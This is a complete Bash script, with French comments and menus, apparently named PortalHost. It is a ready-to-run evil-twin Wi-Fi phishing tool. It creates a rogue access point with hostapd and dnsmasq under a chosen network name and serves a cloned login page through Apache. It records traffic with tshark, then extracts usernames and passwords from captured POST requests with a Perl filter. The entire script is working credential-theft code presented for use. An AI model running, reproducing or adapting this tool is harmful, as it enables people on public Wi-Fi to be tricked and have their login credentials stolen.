#!/bin/bash


if [ "$EUID" -ne 0 ]; then
    echo "Attention : Vous devez être en mode superutilisateur pour exécuter ce script."
    exit 1
fi


function afficher_titre {
    
    rouge="\e[31m"
    gras="\e[1m"

    
    reset="\e[0m"
    echo -e "${rouge}${gras}"
    

    echo "
 ______   ______     ______     ______   ______     __         __  __     ______     ______     ______  
/\  == \ /\  __ \   /\  == \   /\__  _\ /\  __ \   /\ \       /\ \_\ \   /\  __ \   /\  ___\   /\__  _\ 
\ \  _-/ \ \ \/\ \  \ \  __<   \/_/\ \/ \ \  __ \  \ \ \____  \ \  __ \  \ \ \/\ \  \ \___  \  \/_/\ \/ 
 \ \_\    \ \_____\  \ \_\ \_\    \ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \/\_____\    \ \_\ 
  \/_/     \/_____/   \/_/ /_/     \/_/   \/_/\/_/   \/_____/   \/_/\/_/   \/_____/   \/_____/     \/_/ _______v.1_______
    
    Created by flamendO
    "
    echo -e "${reset}" 
}

# afficher le menu
function afficher_parametres_reseau {
    clear
    rouge="\e[31m"
    gras="\e[1m"
    reset="\e[0m"
    cyan="\e[36m"
    echo 
    echo 
    echo -e "${rouge}${gras}Interfaces réseau disponibles: ${reset}"
    echo ""
    echo ""
    echo -e "${gras}-----------------------------------------${reset}"

    interfaces=()
    i=0
    while IFS=':' read -r name _; do
        if [[ $name =~ ^[a-zA-Z0-9]+ ]]; then
            if [[ "$name" != "lo" && "$name" != "docker0" ]]; then
                interfaces+=("$name")
                echo -e "${gras}$((i+1)). ${cyan} $name ${reset}"
                ((i++))
            fi
        fi
    done < <(ifconfig -a) #  avec < il faut un fichier textuel à part alors qu'avec << pas besoin
    echo -e "${gras}Q. ${rouge}Retour Menu ${reset}"
    echo -e "${gras}-----------------------------------------${reset}"
    echo ""
    echo ""
}

# FONCTION DNSMASQ et HOSTAPD
function modifier_dnsmasq_conf {
    interface_choice=${interfaces[$(( $choix-1 ))]}
    echo "${interface_choice}"
    sed -i "s/^interface=.*/interface=$interface_choice/" dnsmasq.conf
    sed -i "s/^interface=.*/interface=$interface_choice/" hostapd.conf #sed permet de modifier un flux entrant,  sans modifier le fichier d'origine. Si on veut modifier le fichier d'entrée directement, vous pouvez utiliser l'option -i :
    echo "Fichier dnsmasq.conf modifié avec l'interface : $interface_choice"
}






#MENU RESEAU

menu_reseau() {
    gras="\e[1m"
    reset="\e[0m"
    while true; do
        
        afficher_parametres_reseau
        echo -e "${gras}Choisis une option : ${reset}"
        read choix

        
        

        case $choix in
            [1-9])
                if [[ $choix -le ${#interfaces[@]} ]]; then
                    echo "TEST"
                    sleep 2
                    modifier_dnsmasq_conf $choix
                    break
                else
                    echo "Oups ! Pas valide."
                    break
                fi
                ;;
            q|Q)
                clear
                sleep 1
                break
                ;;
            *)
                echo "Oups ! Pas valide."
                break
                ;;
        esac

        read -p  "Appuyez sur Entrée pour continuer..."
        break
    done


}


function show_menu() {
    cyan="\e[36m"

    
    gras="\e[1m"

    
    reset="\e[0m"

    echo -e "${gras} Liste des fichiers (pages web) disponibles : ${reset}"
    echo -e "${cyan}${gras}"
    files=(html_files/*)
    for i in "${!files[@]}"; do
        echo "$((i+1)). $(basename "${files[i]}")"
    done
    echo -e "${reset}"
}

function backup_files() {
    source_directory="/var/www/html"
    backup_directory="old_html_files"

    if [ -d "$source_directory" ]; then
        sudo mv "$source_directory" "$backup_directory" 2>/dev/null
    fi
    sudo mkdir -p "$source_directory"
}

function copy_files() {
    source_directory="html_files"
    chosen_file="${files[$(($choice-1))]}"
    target_directory="/var/www/html"

    if [ -d "$target_directory" ]; then
        sudo rm -rf "$target_directory"
    fi
    sudo cp -R "$chosen_file" "$target_directory"
}

function backup_config() {
    source_file="/etc/apache2/sites-available/000-default.conf"
    backup_directory="old_conf"

    if [ -f "$source_file" ]; then
        sudo mv "$source_file" "$backup_directory" 2>/dev/null
    fi
}

function copy_config() {
    source_file="000-default.conf"
    target_directory="/etc/apache2/sites-available/"

    sudo cp "$source_file" "$target_directory"
}

function main() {

    clear
    
    rouge="\e[31m"

    
    gras="\e[1m"

    
    reset="\e[0m"
    echo ""
    echo ""
    echo -e "${rouge}${gras}"
    echo "Bienvenue dans l'Espace de vos pages web!"
    echo -e "${reset}"
    echo "--------------------------------------------------"
    echo ""
    echo ""
    show_menu
    echo -e "${gras}"
    read -p "Entrez le numéro correspondant à la page web à copier : " choice
    echo -e "${reset}"

    if [ "$choice" -ge 1 ] && [ "$choice" -le "${#files[@]}" ]; then
        chosen_file="${files[$(($choice-1))]}"
        echo "Vous avez choisi le fichier : $(basename "$chosen_file")"

        echo -e "${gras}Chargement en cours ...${reset}"
        backup_files
        copy_files
        backup_config
        copy_config

        echo -e "${gras}Terminé !${reset}"
        sleep 2
    else
        echo "Choix invalide. Veuillez entrer un numéro valide."
        sleep 2
    fi
}






















#ATTAQUE
attack_running=0

function stop_attack {
    if [ $attack_running -eq 1 ]; then
        reinitialiser_parametres

        
        pkill tshark
        wait 

        
        attack_running=0

        
        exit 0
    fi
}

trap 'stop_attack' SIGINT


function attack {
    attack_running=1
    
    gras="\e[1m"
    reset="\e[0m"
    read -p "Entrer le nom du réseau souhaité : " ssid_name
    sed -i "s/^ssid=.*/ssid=$ssid_name/" hostapd.conf
    echo "Interface choisie : $interface_choice"
    ifconfig $interface_choice 192.168.1.1/24

    
    (dnsmasq -C dnsmasq.conf &)
    (hostapd hostapd.conf &)

    
    sleep 2

    
    (sudo service apache2 start &)
    
    echo -e "\e[1mPOUR ARRETER L'ATTAQUE, FAITES DEUX FOIS DE SUITE\e[0m\e[31m\e[1m : CTRL+C\e[0m"

    #Capture 

    if [[ -n "$SUDO_USER" ]]; then
        # Si oui, exécuter tshark en arrière-plan avec l'utilisateur réel (pas en tant que root)
        sudo -u "$SUDO_USER" tshark -i wlan0 -w capture.cap &
    else
        # Sinon, exécuter tshark en arrière-plan normal
        tshark -i wlan0 -w capture.cap &
    fi

    
    while true; do
        sleep 1
    done
}


function read_captured_data() {
    echo "Lecture du fichier capture.cap..."

    # Filtrage
    tshark -r capture.cap -Y "http.request.method == POST" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.uri -e http.request.method -e http.file_data > filtered_data.txt 2>/dev/null &




    if [ -f filtered_data.txt ]; then
    # Le fichier n'est pas vide et contient des caractères 
    echo ""
    echo ""
    echo -e "\e[1m---------------------------------------------------------------------\e[0m"
    echo -e "\e[1m Les données ont été sauvegardées dans le fichier filtered_data.txt.\e[0m"
    echo -e "\e[1m---------------------------------------------------------------------\e[0m"
    echo ""
    echo ""
else
    # Le fichier existe pas
    echo ""
    echo ""
    echo -e "\e[1m---------------------------------------------------------------------\e[0m"
    echo -e "\e[1m Aucune donnée n'a été trouvée.\e[0m"
    echo -e "\e[1m---------------------------------------------------------------------\e[0m"
    echo ""
    echo ""
    
    read -n 1 -s -r -p "Appuyez sur une touche pour quitter..."
    exit 0
fi


    echo ""
    echo ""
    
    
    read -n 1 -s -r -p "Appuyez sur une touche pour voir les données..."

    
    echo "Contenu du fichier filtered_data.txt :"
    echo ""
    echo "--------------------------------------"
    gras="\e[1m"
    reset="\e[0m"
    echo ""
    perl -MURI::Escape -ne 'while (/(\b(?:username|login|user)=(.*?))&/g) { $user = uri_unescape($2) } while (/(\b(?:password|pass|motdepasse|key)=(.*?))&/g) { $pass = uri_unescape($2) } if ($user && $pass) { printf "Username: %s\nPassword: %s\n", $user, $pass }' filtered_data.txt > filtered_data_filtered.txt

    

    
    echo -e "${gras}"
    cat filtered_data_filtered.txt
    echo -e "${reset}"

    sleep 1

    echo ""
    echo "--------------------------------------"
    echo ""

    
    read -n 1 -s -r -p "Appuyez sur une touche pour quitter..."
    clear
}


#REINITIALISER

parametres_reinitialises=false
function reinitialiser_parametres {
    
    killall -SIGINT dnsmasq hostapd tshark

    
    sudo rm -rf /var/www/html/*
    sudo cp -R old_html_files/* /var/www/html/

    
    sudo rm -f /etc/apache2/sites-available/000-default.conf
    sudo cp old_conf/000-default.conf /etc/apache2/sites-available/

    
    sudo ip addr flush dev wlan0
    sudo ip link set wlan0 down
    sudo ip link set wlan0 up

    
    sudo service apache2 stop
    sudo systemctl stop dnsmasq
    sudo kill $(sudo netstat -lnp | grep :53 | awk '{print $7}' | awk -F"/" '{ print $1 }')
    clear
    echo "Paramètres réinitialisés avec succès !"
    

    sleep 1

    read_captured_data

}








#MENU



afficher_menu() {
    clear
    afficher_titre

    gras="\e[1m"
    reset="\e[0m"
    echo -e "${gras}"
    echo "1. Choisir l'interface réseau"
    echo "---------------------------"
    echo "2. Choisir la page à copier"
    echo "---------------------------"
    echo "3. Lancer attaque"
    echo "---------------------------"
    echo "4. Afficher données reçues"
    echo "---------------------------"
    echo "Q. Quitter"
    echo "   "
    echo "   "
    echo -e "${reset}"
}


while true; do
    cyan="\e[36m"
    gras="\e[1m"
    reset="\e[0m"
    afficher_menu
    echo -e "${cyan}${gras}"
    read -p "Bonjour ! Choisissez une option : " choix_menu
    echo -e "${reset}"

    case $choix_menu in
        1)
            menu_reseau
            ;;

        2)
            main
            ;;

        3)
            attack
            ;;

        4)
            read_captured_data
            ;;
             
        [Qq])
            clear

            echo -e "\e[1m À bientôt ! \e[0m"
            exit 0
            ;;
        esac
        echo "Test"
        
done